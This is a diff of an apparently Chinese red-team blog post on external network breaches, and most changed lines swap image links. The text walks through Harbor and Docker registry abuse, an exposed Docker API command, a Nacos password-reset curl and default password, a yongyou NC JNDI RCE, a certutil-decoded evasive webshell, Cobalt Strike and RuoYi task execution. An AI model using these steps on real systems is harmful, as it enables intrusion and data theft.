+<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e6%94%bb%e9%98%b2%e5%ae%9e%e6%88%98%e5%a4%96%e7%bd%91%e7%aa%81%e7%a0%b4/attach-ff3a1b05088baedcae2323da2f0c6634277c44c6.png" title="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/攻防实战外网突破/attach-ff3a1b05088baedcae2323da2f0c6634277c44c6.png" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/攻防实战外网突破/attach-ff3a1b05088baedcae2323da2f0c6634277c44c6.png">
         
     </a></p>
 <h2 id="2云原生安全" class="headerLink">
     <a href="#2%e4%ba%91%e5%8e%9f%e7%94%9f%e5%ae%89%e5%85%a8" class="header-mark"></a>2、云原生安全</h2><p>容器化部署和微服务架构为应用程序开发和部署提供了更好的灵活性、可伸缩性、可维护性和性能，受到了越来越多厂商的使用，新的应用就会引入新的攻击面，如容器逃逸、服务间攻击、API滥用等。攻击者可以利用这些新的入口点来攻击应用程序和数据。并且在云原生环境下管理用户和服务的身份验证和授权变得更加复杂。许多应用开发商在追求容器化和云原生架构的便利性和效率时，安全性常常被忽视或放在次要位置。这就直接导致了云原生环境的脆弱，容易受到各种安全威胁和攻击。</p>
 <h2 id="21harbor-镜像仓库" class="headerLink">
     <a href="#21harbor-%e9%95%9c%e5%83%8f%e4%bb%93%e5%ba%93" class="header-mark"></a>2.1、Harbor 镜像仓库</h2><p>Harbor是一个开源的容器镜像仓库管理器，旨在帮助组织存储、管理和分发Docker容器镜像，但是Harbor存在一个充满争议的“漏洞”：任意用户能够直接获取public的镜像。</p>
-<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%94%bb%e9%98%b2%e5%ae%9e%e6%88%98%e5%a4%96%e7%bd%91%e7%aa%81%e7%a0%b4/attach-3ec46704bd4d00efdb7cd3a3a2d9672cacc1e7ee.png" title="https://www.bysec.cn/OSS/img/攻防实战外网突破/attach-3ec46704bd4d00efdb7cd3a3a2d9672cacc1e7ee.png" data-thumbnail="https://www.bysec.cn/OSS/img/攻防实战外网突破/attach-3ec46704bd4d00efdb7cd3a3a2d9672cacc1e7ee.png">
+<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e6%94%bb%e9%98%b2%e5%ae%9e%e6%88%98%e5%a4%96%e7%bd%91%e7%aa%81%e7%a0%b4/attach-3ec46704bd4d00efdb7cd3a3a2d9672cacc1e7ee.png" title="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/攻防实战外网突破/attach-3ec46704bd4d00efdb7cd3a3a2d9672cacc1e7ee.png" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/攻防实战外网突破/attach-3ec46704bd4d00efdb7cd3a3a2d9672cacc1e7ee.png">
         
     </a></p>
 <p>可以直接拉取下载镜像文件，可以利用脚本批量下载</p>
-<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%94%bb%e9%98%b2%e5%ae%9e%e6%88%98%e5%a4%96%e7%bd%91%e7%aa%81%e7%a0%b4/attach-f74f3ef03424a1113ec294ac4cbd2b357319fd30.png" title="https://www.bysec.cn/OSS/img/攻防实战外网突破/attach-f74f3ef03424a1113ec294ac4cbd2b357319fd30.png" data-thumbnail="https://www.bysec.cn/OSS/img/攻防实战外网突破/attach-f74f3ef03424a1113ec294ac4cbd2b357319fd30.png">
+<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e6%94%bb%e9%98%b2%e5%ae%9e%e6%88%98%e5%a4%96%e7%bd%91%e7%aa%81%e7%a0%b4/attach-f74f3ef03424a1113ec294ac4cbd2b357319fd30.png" title="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/攻防实战外网突破/attach-f74f3ef03424a1113ec294ac4cbd2b357319fd30.png" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/攻防实战外网突破/attach-f74f3ef03424a1113ec294ac4cbd2b357319fd30.png">
         
     </a></p>
 <h2 id="22疑似后门" class="headerLink">
     <a href="#22%e7%96%91%e4%bc%bc%e5%90%8e%e9%97%a8" class="header-mark"></a>2.2、疑似后门</h2><p>通过镜像文件获取jar包，获取配置文件等敏感信息，对jar包的class文件进行反编译，进行代码审计获取到一个类似后门的漏洞，该接口只需要使用用户名，即可登录系统后台。管理员权限配合文件上传获取服务器权限。</p>
-<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%94%bb%e9%98%b2%e5%ae%9e%e6%88%98%e5%a4%96%e7%bd%91%e7%aa%81%e7%a0%b4/attach-7db617495fcff84526349e5c19fb2c8824e5a18d.png" title="https://www.bysec.cn/OSS/img/攻防实战外网突破/attach-7db617495fcff84526349e5c19fb2c8824e5a18d.png" data-thumbnail="https://www.bysec.cn/OSS/img/攻防实战外网突破/attach-7db617495fcff84526349e5c19fb2c8824e5a18d.png">
+<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e6%94%bb%e9%98%b2%e5%ae%9e%e6%88%98%e5%a4%96%e7%bd%91%e7%aa%81%e7%a0%b4/attach-7db617495fcff84526349e5c19fb2c8824e5a18d.png" title="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/攻防实战外网突破/attach-7db617495fcff84526349e5c19fb2c8824e5a18d.png" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/攻防实战外网突破/attach-7db617495fcff84526349e5c19fb2c8824e5a18d.png">
         
     </a></p>
 <p>通过配置文件连接数据库等</p>
-<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%94%bb%e9%98%b2%e5%ae%9e%e6%88%98%e5%a4%96%e7%bd%91%e7%aa%81%e7%a0%b4/attach-9663ada321e037f5d9e7399a0c7c5861b57b5c3f.png" title="https://www.bysec.cn/OSS/img/攻防实战外网突破/attach-9663ada321e037f5d9e7399a0c7c5861b57b5c3f.png" data-thumbnail="https://www.bysec.cn/OSS/img/攻防实战外网突破/attach-9663ada321e037f5d9e7399a0c7c5861b57b5c3f.png">
+<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e6%94%bb%e9%98%b2%e5%ae%9e%e6%88%98%e5%a4%96%e7%bd%91%e7%aa%81%e7%a0%b4/attach-9663ada321e037f5d9e7399a0c7c5861b57b5c3f.png" title="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/攻防实战外网突破/attach-9663ada321e037f5d9e7399a0c7c5861b57b5c3f.png" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/攻防实战外网突破/attach-9663ada321e037f5d9e7399a0c7c5861b57b5c3f.png">
         
     </a></p>
 <h2 id="23docker未授权" class="headerLink">
     <a href="#23docker%e6%9c%aa%e6%8e%88%e6%9d%83" class="header-mark"></a>2.3、docker未授权</h2><h3 id="231-registry-api未授权访问" class="headerLink">
     <a href="#231-registry-api%e6%9c%aa%e6%8e%88%e6%9d%83%e8%ae%bf%e9%97%ae" class="header-mark"></a>2.3.1、 registry api未授权访问</h3><p>在 Docker Registry API 中，认证和授权通常是基于访问令牌（Access Token）或者用户名和密码的。如果未正确设置访问控制权限，即会造成未授权访问漏洞，攻击者可直接下载registry仓库的所有镜像容器。</p>
 <p>访问/v2/_catalog接口即可查看全部仓库内容</p>
-<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%94%bb%e9%98%b2%e5%ae%9e%e6%88%98%e5%a4%96%e7%bd%91%e7%aa%81%e7%a0%b4/attach-c506302d2a4bd8ad82556dbabd2be3a46eb0eae8.png" title="https://www.bysec.cn/OSS/img/攻防实战外网突破/attach-c506302d2a4bd8ad82556dbabd2be3a46eb0eae8.png" data-thumbnail="https://www.bysec.cn/OSS/img/攻防实战外网突破/attach-c506302d2a4bd8ad82556dbabd2be3a46eb0eae8.png">
+<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e6%94%bb%e9%98%b2%e5%ae%9e%e6%88%98%e5%a4%96%e7%bd%91%e7%aa%81%e7%a0%b4/attach-c506302d2a4bd8ad82556dbabd2be3a46eb0eae8.png" title="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/攻防实战外网突破/attach-c506302d2a4bd8ad82556dbabd2be3a46eb0eae8.png" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/攻防实战外网突破/attach-c506302d2a4bd8ad82556dbabd2be3a46eb0eae8.png">
         
     </a><br>
 <a href="https://github.com/Soufaker/docker_v2_catalog" target="_blank" rel="noopener noreferrer">https://github.com/Soufaker/docker_v2_catalog</a></p>
@@ -1444,7 +1444,7 @@
 <pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1">#查看容器 docker -H tcp://&lt;target&gt;:2375 ps -a
 </span></span></span></code></pre></td></tr></table>
 </div>
-</div><p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%94%bb%e9%98%b2%e5%ae%9e%e6%88%98%e5%a4%96%e7%bd%91%e7%aa%81%e7%a0%b4/attach-51cfb8bea7521008030a205378af8c6c852f3660.png" title="https://www.bysec.cn/OSS/img/攻防实战外网突破/attach-51cfb8bea7521008030a205378af8c6c852f3660.png" data-thumbnail="https://www.bysec.cn/OSS/img/攻防实战外网突破/attach-51cfb8bea7521008030a205378af8c6c852f3660.png">
+</div><p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e6%94%bb%e9%98%b2%e5%ae%9e%e6%88%98%e5%a4%96%e7%bd%91%e7%aa%81%e7%a0%b4/attach-51cfb8bea7521008030a205378af8c6c852f3660.png" title="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/攻防实战外网突破/attach-51cfb8bea7521008030a205378af8c6c852f3660.png" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/攻防实战外网突破/attach-51cfb8bea7521008030a205378af8c6c852f3660.png">
         
     </a></p>
 <div class="highlight"><div class="chroma">
@@ -1462,11 +1462,11 @@
 <p><strong>任意用户添加</strong>：POST <a href="http://192.168.80.131:8848/nacos/v1/auth/users?pageNo=1&amp;pageSize=1" target="_blank" rel="noopener noreferrer">/nacos/v1/auth/users</a> username= &amp; password=</p>
 <p><strong>任意用户密码修改</strong>：curl -X PUT &lsquo;<a href="http://127.0.0.1:8848/nacos/v1/auth/users?accessToken" target="_blank" rel="noopener noreferrer">http://127.0.0.1:8848/nacos/v1/auth/users?accessToken</a>\=&rsquo; -H &lsquo;User-Agent:Nacos-Server&rsquo; -d &lsquo;username\=test1&amp;newPassword\=test2&rsquo;</p>
 <p><strong>弱口令</strong>：nacos/nacos</p>
-<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%94%bb%e9%98%b2%e5%ae%9e%e6%88%98%e5%a4%96%e7%bd%91%e7%aa%81%e7%a0%b4/attach-bc51f0813b8aa1b7f7072167c68ba15a26d10279.png" title="https://www.bysec.cn/OSS/img/攻防实战外网突破/attach-bc51f0813b8aa1b7f7072167c68ba15a26d10279.png" data-thumbnail="https://www.bysec.cn/OSS/img/攻防实战外网突破/attach-bc51f0813b8aa1b7f7072167c68ba15a26d10279.png">
+<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e6%94%bb%e9%98%b2%e5%ae%9e%e6%88%98%e5%a4%96%e7%bd%91%e7%aa%81%e7%a0%b4/attach-bc51f0813b8aa1b7f7072167c68ba15a26d10279.png" title="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/攻防实战外网突破/attach-bc51f0813b8aa1b7f7072167c68ba15a26d10279.png" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/攻防实战外网突破/attach-bc51f0813b8aa1b7f7072167c68ba15a26d10279.png">
         
     </a></p>
 <p>通过编排密码爆破进后台，发现大量配置文件，但敏感信息均被加密</p>
-<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%94%bb%e9%98%b2%e5%ae%9e%e6%88%98%e5%a4%96%e7%bd%91%e7%aa%81%e7%a0%b4/attach-62d51f1c7326e7114b1022865a3669ed6d4f46b7.png" title="https://www.bysec.cn/OSS/img/攻防实战外网突破/attach-62d51f1c7326e7114b1022865a3669ed6d4f46b7.png" data-thumbnail="https://www.bysec.cn/OSS/img/攻防实战外网突破/attach-62d51f1c7326e7114b1022865a3669ed6d4f46b7.png">
+<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e6%94%bb%e9%98%b2%e5%ae%9e%e6%88%98%e5%a4%96%e7%bd%91%e7%aa%81%e7%a0%b4/attach-62d51f1c7326e7114b1022865a3669ed6d4f46b7.png" title="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/攻防实战外网突破/attach-62d51f1c7326e7114b1022865a3669ed6d4f46b7.png" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/攻防实战外网突破/attach-62d51f1c7326e7114b1022865a3669ed6d4f46b7.png">
         
     </a></p>
 <h3 id="241jasypt加密" class="headerLink">
@@ -1499,19 +1499,19 @@
 </span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>但是客户端加密的安全性主要依赖于客户端代码的保护和可信任性，当密码泄露后，加密也就自然失效了，在ncaos一个文件中发现jasypt加密密码，可以直接进行解密操作</p>
-<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%94%bb%e9%98%b2%e5%ae%9e%e6%88%98%e5%a4%96%e7%bd%91%e7%aa%81%e7%a0%b4/attach-9faa6a1da39d5898cb65917064c9885c218ded42.png" title="https://www.bysec.cn/OSS/img/攻防实战外网突破/attach-9faa6a1da39d5898cb65917064c9885c218ded42.png" data-thumbnail="https://www.bysec.cn/OSS/img/攻防实战外网突破/attach-9faa6a1da39d5898cb65917064c9885c218ded42.png">
+<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e6%94%bb%e9%98%b2%e5%ae%9e%e6%88%98%e5%a4%96%e7%bd%91%e7%aa%81%e7%a0%b4/attach-9faa6a1da39d5898cb65917064c9885c218ded42.png" title="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/攻防实战外网突破/attach-9faa6a1da39d5898cb65917064c9885c218ded42.png" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/攻防实战外网突破/attach-9faa6a1da39d5898cb65917064c9885c218ded42.png">
         
     </a><br>
 成功连接OSS</p>
-<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%94%bb%e9%98%b2%e5%ae%9e%e6%88%98%e5%a4%96%e7%bd%91%e7%aa%81%e7%a0%b4/attach-572d2495c72d7b1a2b65dce002b6f11edb94260b.png" title="https://www.bysec.cn/OSS/img/攻防实战外网突破/attach-572d2495c72d7b1a2b65dce002b6f11edb94260b.png" data-thumbnail="https://www.bysec.cn/OSS/img/攻防实战外网突破/attach-572d2495c72d7b1a2b65dce002b6f11edb94260b.png">
+<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e6%94%bb%e9%98%b2%e5%ae%9e%e6%88%98%e5%a4%96%e7%bd%91%e7%aa%81%e7%a0%b4/attach-572d2495c72d7b1a2b65dce002b6f11edb94260b.png" title="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/攻防实战外网突破/attach-572d2495c72d7b1a2b65dce002b6f11edb94260b.png" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/攻防实战外网突破/attach-572d2495c72d7b1a2b65dce002b6f11edb94260b.png">
         
     </a></p>
 <p>成功连接数据库</p>
-<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%94%bb%e9%98%b2%e5%ae%9e%e6%88%98%e5%a4%96%e7%bd%91%e7%aa%81%e7%a0%b4/attach-a758622d45da44e07aa10ed7765337f625f449c5.png" title="https://www.bysec.cn/OSS/img/攻防实战外网突破/attach-a758622d45da44e07aa10ed7765337f625f449c5.png" data-thumbnail="https://www.bysec.cn/OSS/img/攻防实战外网突破/attach-a758622d45da44e07aa10ed7765337f625f449c5.png">
+<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e6%94%bb%e9%98%b2%e5%ae%9e%e6%88%98%e5%a4%96%e7%bd%91%e7%aa%81%e7%a0%b4/attach-a758622d45da44e07aa10ed7765337f625f449c5.png" title="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/攻防实战外网突破/attach-a758622d45da44e07aa10ed7765337f625f449c5.png" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/攻防实战外网突破/attach-a758622d45da44e07aa10ed7765337f625f449c5.png">
         
     </a></p>
 <p>小程序token，接管小程序</p>
-<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%94%bb%e9%98%b2%e5%ae%9e%e6%88%98%e5%a4%96%e7%bd%91%e7%aa%81%e7%a0%b4/attach-d07c1eb2ba1682ffe1f4a4733a0f5edf186b18de.png" title="https://www.bysec.cn/OSS/img/攻防实战外网突破/attach-d07c1eb2ba1682ffe1f4a4733a0f5edf186b18de.png" data-thumbnail="https://www.bysec.cn/OSS/img/攻防实战外网突破/attach-d07c1eb2ba1682ffe1f4a4733a0f5edf186b18de.png">
+<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e6%94%bb%e9%98%b2%e5%ae%9e%e6%88%98%e5%a4%96%e7%bd%91%e7%aa%81%e7%a0%b4/attach-d07c1eb2ba1682ffe1f4a4733a0f5edf186b18de.png" title="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/攻防实战外网突破/attach-d07c1eb2ba1682ffe1f4a4733a0f5edf186b18de.png" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/攻防实战外网突破/attach-d07c1eb2ba1682ffe1f4a4733a0f5edf186b18de.png">
         
     </a></p>
 <p>达梦数据库是国产化的关系型数据库，使用下面工具可以进行连接</p>
@@ -1520,7 +1520,7 @@
     <a href="#3nday" class="header-mark"></a>3、Nday</h2><h2 id="31yongyounc-jsinvoke-rce漏洞" class="headerLink">
     <a href="#31yongyounc-jsinvoke-rce%e6%bc%8f%e6%b4%9e" class="header-mark"></a>3.1、yongyouNC jsInvoke rce漏洞</h2><p>漏洞利用方法，通过Java反射机制创建一个javax.naming.InitialContext对象，并使用LDAP协议连接到指定的IP地址和端口，然后调用&quot;nc.itf.iufo.IBaseSPService&quot;服务中的&quot;saveXStreamConfig&quot;方法，接受对象和字符串作为参数，达到命令执行的效果。</p>
 <p>命令执行成功，但是目标系统存在杀软，无法直接上传文件</p>
-<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%94%bb%e9%98%b2%e5%ae%9e%e6%88%98%e5%a4%96%e7%bd%91%e7%aa%81%e7%a0%b4/attach-7965cfa7808da6e0981fbf7b46a710bce3dcf9db.png" title="https://www.bysec.cn/OSS/img/攻防实战外网突破/attach-7965cfa7808da6e0981fbf7b46a710bce3dcf9db.png" data-thumbnail="https://www.bysec.cn/OSS/img/攻防实战外网突破/attach-7965cfa7808da6e0981fbf7b46a710bce3dcf9db.png">
+<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e6%94%bb%e9%98%b2%e5%ae%9e%e6%88%98%e5%a4%96%e7%bd%91%e7%aa%81%e7%a0%b4/attach-7965cfa7808da6e0981fbf7b46a710bce3dcf9db.png" title="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/攻防实战外网突破/attach-7965cfa7808da6e0981fbf7b46a710bce3dcf9db.png" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/攻防实战外网突破/attach-7965cfa7808da6e0981fbf7b46a710bce3dcf9db.png">
         
     </a></p>
 <h3 id="311certutil" class="headerLink">
@@ -1533,7 +1533,7 @@
 <pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">bash64编码后的免杀马</span> <span class="o">&gt;</span> <span class="nx">myfile</span><span class="o">.</span><span class="nx">jsp</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%94%bb%e9%98%b2%e5%ae%9e%e6%88%98%e5%a4%96%e7%bd%91%e7%aa%81%e7%a0%b4/attach-ca978a10493d65b989cf352bbbd125c2f77d8d4b.png" title="https://www.bysec.cn/OSS/img/攻防实战外网突破/attach-ca978a10493d65b989cf352bbbd125c2f77d8d4b.png" data-thumbnail="https://www.bysec.cn/OSS/img/攻防实战外网突破/attach-ca978a10493d65b989cf352bbbd125c2f77d8d4b.png">
+</div><p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e6%94%bb%e9%98%b2%e5%ae%9e%e6%88%98%e5%a4%96%e7%bd%91%e7%aa%81%e7%a0%b4/attach-ca978a10493d65b989cf352bbbd125c2f77d8d4b.png" title="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/攻防实战外网突破/attach-ca978a10493d65b989cf352bbbd125c2f77d8d4b.png" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/攻防实战外网突破/attach-ca978a10493d65b989cf352bbbd125c2f77d8d4b.png">
         
     </a></p>
 <p>使用certutil进行解码</p>
@@ -1545,37 +1545,37 @@
 <pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">certutil</span> <span class="o">-</span><span class="nx">decode</span> <span class="nx">木马相对路径</span> <span class="nx">解码后的木马相对路径</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%94%bb%e9%98%b2%e5%ae%9e%e6%88%98%e5%a4%96%e7%bd%91%e7%aa%81%e7%a0%b4/attach-0069dbaf0c23e4ea2e284cccc370d0508c1f35a0.png" title="https://www.bysec.cn/OSS/img/攻防实战外网突破/attach-0069dbaf0c23e4ea2e284cccc370d0508c1f35a0.png" data-thumbnail="https://www.bysec.cn/OSS/img/攻防实战外网突破/attach-0069dbaf0c23e4ea2e284cccc370d0508c1f35a0.png">
+</div><p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e6%94%bb%e9%98%b2%e5%ae%9e%e6%88%98%e5%a4%96%e7%bd%91%e7%aa%81%e7%a0%b4/attach-0069dbaf0c23e4ea2e284cccc370d0508c1f35a0.png" title="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/攻防实战外网突破/attach-0069dbaf0c23e4ea2e284cccc370d0508c1f35a0.png" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/攻防实战外网突破/attach-0069dbaf0c23e4ea2e284cccc370d0508c1f35a0.png">
         
     </a></p>
 <p>冰蝎上线并上线CS</p>
-<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%94%bb%e9%98%b2%e5%ae%9e%e6%88%98%e5%a4%96%e7%bd%91%e7%aa%81%e7%a0%b4/attach-1c88c33f8c747709119140b588136098628a120c.png" title="https://www.bysec.cn/OSS/img/攻防实战外网突破/attach-1c88c33f8c747709119140b588136098628a120c.png" data-thumbnail="https://www.bysec.cn/OSS/img/攻防实战外网突破/attach-1c88c33f8c747709119140b588136098628a120c.png">
+<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e6%94%bb%e9%98%b2%e5%ae%9e%e6%88%98%e5%a4%96%e7%bd%91%e7%aa%81%e7%a0%b4/attach-1c88c33f8c747709119140b588136098628a120c.png" title="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/攻防实战外网突破/attach-1c88c33f8c747709119140b588136098628a120c.png" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/攻防实战外网突破/attach-1c88c33f8c747709119140b588136098628a120c.png">
         
     </a></p>
 <h2 id="32若依二开" class="headerLink">
     <a href="#32%e8%8b%a5%e4%be%9d%e4%ba%8c%e5%bc%80" class="header-mark"></a>3.2、若依二开</h2><p>shiro的洞修复了，找到一个前台信息泄露漏洞</p>
-<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%94%bb%e9%98%b2%e5%ae%9e%e6%88%98%e5%a4%96%e7%bd%91%e7%aa%81%e7%a0%b4/attach-cd3041c5be5bda7370ccbdaa6c958df8b775591b.png" title="https://www.bysec.cn/OSS/img/攻防实战外网突破/attach-cd3041c5be5bda7370ccbdaa6c958df8b775591b.png" data-thumbnail="https://www.bysec.cn/OSS/img/攻防实战外网突破/attach-cd3041c5be5bda7370ccbdaa6c958df8b775591b.png">
+<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e6%94%bb%e9%98%b2%e5%ae%9e%e6%88%98%e5%a4%96%e7%bd%91%e7%aa%81%e7%a0%b4/attach-cd3041c5be5bda7370ccbdaa6c958df8b775591b.png" title="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/攻防实战外网突破/attach-cd3041c5be5bda7370ccbdaa6c958df8b775591b.png" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/攻防实战外网突破/attach-cd3041c5be5bda7370ccbdaa6c958df8b775591b.png">
         
     </a></p>
 <p>通过获取到的用户名，使用弱口令进入后台，普通权限</p>
-<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%94%bb%e9%98%b2%e5%ae%9e%e6%88%98%e5%a4%96%e7%bd%91%e7%aa%81%e7%a0%b4/attach-85e0760d8a43c53ef6903fe8d54e6f8d2ff19d63.png" title="https://www.bysec.cn/OSS/img/攻防实战外网突破/attach-85e0760d8a43c53ef6903fe8d54e6f8d2ff19d63.png" data-thumbnail="https://www.bysec.cn/OSS/img/攻防实战外网突破/attach-85e0760d8a43c53ef6903fe8d54e6f8d2ff19d63.png">
+<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e6%94%bb%e9%98%b2%e5%ae%9e%e6%88%98%e5%a4%96%e7%bd%91%e7%aa%81%e7%a0%b4/attach-85e0760d8a43c53ef6903fe8d54e6f8d2ff19d63.png" title="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/攻防实战外网突破/attach-85e0760d8a43c53ef6903fe8d54e6f8d2ff19d63.png" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/攻防实战外网突破/attach-85e0760d8a43c53ef6903fe8d54e6f8d2ff19d63.png">
         
     </a></p>
 <p>再次对公告发布人员猜解密码，成功登录后台，多了系统管理权限，直接添加用户赋予最高权限</p>
-<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%94%bb%e9%98%b2%e5%ae%9e%e6%88%98%e5%a4%96%e7%bd%91%e7%aa%81%e7%a0%b4/attach-cc108479b419389d1d681b8639c528727d8286a6.png" title="https://www.bysec.cn/OSS/img/攻防实战外网突破/attach-cc108479b419389d1d681b8639c528727d8286a6.png" data-thumbnail="https://www.bysec.cn/OSS/img/攻防实战外网突破/attach-cc108479b419389d1d681b8639c528727d8286a6.png">
+<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e6%94%bb%e9%98%b2%e5%ae%9e%e6%88%98%e5%a4%96%e7%bd%91%e7%aa%81%e7%a0%b4/attach-cc108479b419389d1d681b8639c528727d8286a6.png" title="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/攻防实战外网突破/attach-cc108479b419389d1d681b8639c528727d8286a6.png" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/攻防实战外网突破/attach-cc108479b419389d1d681b8639c528727d8286a6.png">
         
     </a></p>
 <p>新增用户登录，发现定时任务功能，直接使用定时任务执行命令</p>
-<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%94%bb%e9%98%b2%e5%ae%9e%e6%88%98%e5%a4%96%e7%bd%91%e7%aa%81%e7%a0%b4/attach-ac0b3d70b98d7dd50bfe09bcff238f0ed23089df.png" title="https://www.bysec.cn/OSS/img/攻防实战外网突破/attach-ac0b3d70b98d7dd50bfe09bcff238f0ed23089df.png" data-thumbnail="https://www.bysec.cn/OSS/img/攻防实战外网突破/attach-ac0b3d70b98d7dd50bfe09bcff238f0ed23089df.png">
